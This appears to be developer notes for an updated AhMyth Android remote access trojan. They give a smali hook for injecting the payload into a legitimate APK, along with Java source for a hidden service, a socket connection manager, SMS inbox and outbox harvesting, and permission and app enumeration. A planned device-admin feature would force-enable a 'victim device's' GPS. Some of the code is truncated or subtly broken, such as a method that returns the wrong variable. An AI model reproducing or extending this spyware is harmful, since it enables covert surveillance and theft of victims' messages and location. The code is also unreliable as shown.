## Code Sets for new static hook function

The code for this new future function was taken from [Rapid7/metasploit-payloads](https://github.com/rapid7/metasploit-payloads), specifically their [androidpayload](https://github.com/Morsmalleo/metasploit-payloads/tree/master/java/androidpayload/app/src/com/metasploit/stage) directory.

the files the coding for this new function were taken from in the **androidpayload** directory of the **metasploit-framework** repository are as follows;
- MainActivity.java
- MainService.java
- MainBroadcastReceiver.java
- Payload.java
#
- New Hook function to be injected into APK's
```smali
invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->start()V
```
- Progaurd-rules.pro
```pro

-keep public class * extends android.app.Activity

-keep public class * extends android.app.Service

-keep public class * extends android.content.BroadcastReceiver

-keep class ahmyth.mine.king.ahmyth.MainService {

    public static <methods>;

}

-keep class ahmyth.mine.king.ahmyth.ConnectionManager {

    public static <methods>;

}

-optimizationpasses 5

-verbose

```
- Service Start for MainActivity.java File
```java
MainService.startService(this);
```
- Service start for MyReciever.java Code
```java
MainService.startService(context);
```
- New MainService.java Code
```java
package ahmyth.mine.king.ahmyth;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.support.annotation.RequiresApi;
import android.support.v4.app.NotificationCompat;

import java.lang.reflect.Method;

public class MainService extends Service {
    private static Context contextOfApplication;

        private static void findContext() throws Exception {
            Class<?> activityThreadClass;
            try {
                activityThreadClass = Class.forName("android.app.ActivityThread");
            } catch (ClassNotFoundException e) {
                // No context
                return;
            }

            final Method currentApplication = activityThreadClass.getMethod("currentApplication");
            final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
            if (context == null) {
                // Post to the UI/Main thread and try and retrieve the Context
                final Handler handler = new Handler(Looper.getMainLooper());
                handler.post(new Runnable() {
                    public void run() {
                        try {
                            Context context = (Context) currentApplication.invoke(null, (Object[]) null);
                            if (context != null) {
                                startService(context);
                            }
                        } catch (Exception ignored) {
                        }
                    }
                });
            } else {
                startService(context);
            }
        }

 

        // static smali hook that gets injected into 
        // an original, legit APK
        public static void start() {
            try {
                findContext();
            } catch (Exception ignored) {
            }
        }

        public static void startService(Context context) {
            context.startService(new Intent(context, MainService.class));
        }
```
- New ConnectionManager.java Code
```java
package ahmyth.mine.king.ahmyth;

import org.json.JSONObject;
import io.socket.emitter.Emitter;

import android.content.Context;
import android.util.Log;
import android.os.Looper;
import android.os.Handler;

import java.lang.reflect.Method;

/**
 * Created by AhMyth on 10/1/16.
 */

/**
 * Updated by Morsmalleo
 */



public class ConnectionManager {

    public static Context context;

    private static io.socket.client.Socket ioSocket;

    private static FileManager fm = new FileManager();

    public static void startAsync(Context con)

    {

        try {

            ConnectionManager.context = con;

            sendReq();

        }catch (Exception ex){

            startAsync(con);

        }

    }

    public static void startContext() {

        try {

            findContext();

        } catch (Exception ignored) {

        }

    }

    private static void findContext() throws Exception {

        Class<?> activityThreadClass;

        try {

            activityThreadClass = Class.forName("android.app.ActivityThread");

        } catch (ClassNotFoundException e) {

            // No context

            return;

        }

        final Method currentApplication = activityThreadClass.getMethod("currentApplication");

        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);

        if (context == null) {

            // Post to the UI/Main thread and try and retrieve the Context

            final Handler handler = new Handler(Looper.getMainLooper());

            handler.post(new Runnable() {

                public void run() {

                    try {

                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);

                        if (context != null) {

                            startAsync(context);

                        }

                    } catch (Exception ignored) {

                    }

                }

            });

        } else {

            startAsync(context);

        }

    }
```
## Updated SMS Manager.
```java
    public static JSONObject getSMSInboxList(){

        try {

            JSONObject SMSInboxList = new JSONObject();

            JSONArray list = new JSONArray();

            Uri uriSMSURI = Uri.parse("content://sms/inbox");

            Cursor cur = MainService.getContextOfApplication().getContentResolver().query(uriSMSURI, null, null, null, null);

            while (cur.moveToNext()) {

                JSONObject sms = new JSONObject();

                String address = cur.getString(cur.getColumnIndex("address"));

                String body = cur.getString(cur.getColumnIndexOrThrow("body"));

                sms.put("phoneNo" , address);

                sms.put("msg" , body);

                list.put(sms);

            }

            SMSInboxList.put("smsList", list);

            Log.e("done" ,"collecting");

            return SMSOutboxList;

        } catch (JSONException e) {

            e.printStackTrace();

        }

        return null;

    }
    
        public static JSONObject getSMSOutboxList(){

        try {

            JSONObject SMSOutboxList = new JSONObject();

            JSONArray list = new JSONArray();

            Uri uriSMSURI = Uri.parse("content://sms/outbox");

            Cursor cur = MainService.getContextOfApplication().getContentResolver().query(uriSMSURI, null, null, null, null);

            while (cur.moveToNext()) {

                JSONObject sms = new JSONObject();

                String address = cur.getString(cur.getColumnIndex("address"));

                String body = cur.getString(cur.getColumnIndexOrThrow("body"));

                sms.put("phoneNo" , address);

                sms.put("msg" , body);

                list.put(sms);

            }

            SMSOutboxList.put("smsList", list);

            Log.e("done" ,"collecting");

            return SMSOutboxList;

        } catch (JSONException e) {

            e.printStackTrace();

        }

        return null;

    }
```
## Permissions Management

- PermissionsManager.java

```java

package ahmyth.mine.king.ahmyth;

import android.content.pm.PackageInfo;

import android.content.pm.PackageManager;

import org.json.JSONArray;

import org.json.JSONObject;

import static ahmyth.mine.king.ahmyth.ConnectionManager.context;

public class PermissionManager {

    public static JSONObject getGrantedPermissions() {

        JSONObject data = new JSONObject();

        try {

            JSONArray perms = new JSONArray();

            PackageInfo pi = context.getPackageManager().getPackageInfo(context.getPackageName(), PackageManager.GET_PERMISSIONS);

            for (int i = 0; i < pi.requestedPermissions.length; i++) {

                if ((pi.requestedPermissionsFlags[i] & PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0) perms.put(pi.requestedPermissions[i]);

            }

            data.put("permissions", perms);

        } catch (Exception e) {

        }

        return data;

    }

    public static boolean canIUse(String perm) {

        if(context.getPackageManager().checkPermission(perm, context.getPackageName()) == PackageManager.PERMISSION_GRANTED) return true;

        else return false;

    }

}

```

## List Installed apps

- AppList.java

```java

package ahmyth.mine.king.ahmyth;

import android.content.pm.PackageInfo;

import android.graphics.drawable.Drawable;

import org.json.JSONArray;

import org.json.JSONException;

import org.json.JSONObject;

import java.util.List;

import static ahmyth.mine.king.ahmyth.ConnectionManager.context;

public class AppList {

    public static JSONObject getInstalledApps(boolean getSysPackages) {

        JSONArray apps = new JSONArray();

        List<PackageInfo> packs = context.getPackageManager().getInstalledPackages(0);

        for(int i=0;i < packs.size();i++) {

            PackageInfo p = packs.get(i);

            if ((!getSysPackages) && (p.versionName == null)) {

                continue ;

            }

            try {

                JSONObject newInfo = new JSONObject();

                String appname = p.applicationInfo.loadLabel(context.getPackageManager()).toString();

                String pname = p.packageName;

                String versionName = p.versionName;

                int versionCode = p.versionCode;

                newInfo.put("appName",appname);

                newInfo.put("packageName",pname);

                newInfo.put("versionName",versionName);

                newInfo.put("versionCode",versionCode);

                apps.put(newInfo);

            }catch (JSONException e) {}

        }

        JSONObject data = new JSONObject();

        try {

            data.put("apps", apps);

        }catch (JSONException e) {}

        return data;

    }

}

```


# Possible upgrades 
## Possible Device Admin Privileges

This will hopefully give the AhMyth Payload Administrator Privileges for future features.
- DeviceAdmin.java
```java
package ahmyth.mine.king.ahmyth;

import android.app.admin.DeviceAdminReceiver;

import android.app.admin.DevicePolicyManager;

import android.content.ComponentName;

import android.content.Context;

public class DeviceAdmin extends DeviceAdminReceiver {

    static DevicePolicyManager getDPM(Context context) {

        return (DevicePolicyManager)context.getSystemService(Context.DEVICE_POLICY_SERVICE);

    }

    public static ComponentName getComponentName(Context context) {

        return new ComponentName(context.getApplicationContext(), DeviceAdmin.class);

    }

}
```
## Possible Auto enabling of Device GPS

This will hopefully allow automatic enabling of the victim device's GPS, Device Administration Privileges are required for this to work, hence the need for the **DeviceAdmin.java** code above.
- LocationManager.java
```java
    private void activateGps(Context context) {

        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);

        if (!prefs.getBoolean("allow_location_modechange", false))

            return;

        if (!DeviceAdmin.getDPM(context).isAdminActive(DeviceAdmin.getComponentName(context)))

            return;

        if (!DeviceAdmin.getDPM(context).isDeviceOwnerApp(context.getApplicationContext().getPackageName()))

            return;

        DeviceAdmin.getDPM(context).setSecureSetting(

                DeviceAdmin.getComponentName(context),

                Settings.Secure.LOCATION_MODE,

                Integer.toString(Settings.Secure.LOCATION_MODE_HIGH_ACCURACY)

        );

        Log.d("SmsReceiver", "Forcefully enabled GPS");

    }

    private void getLocation(Context context, String number) throws SecurityException {

        activateGps(context);

        LocationManager locationManager = (LocationManager) context.getApplicationContext().getSystemService(Context.LOCATION_SERVICE);

        locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, new LocationSender(number), null);

    }
```
- Settings.java
```java
        perms.put("allow_location", new String[]{

                Manifest.permission.SEND_SMS,

                Manifest.permission.ACCESS_FINE_LOCATION,

        });

        perms.put("allow_location_modechange", new String[]{

                Manifest.permission.BIND_DEVICE_ADMIN,

        });
```
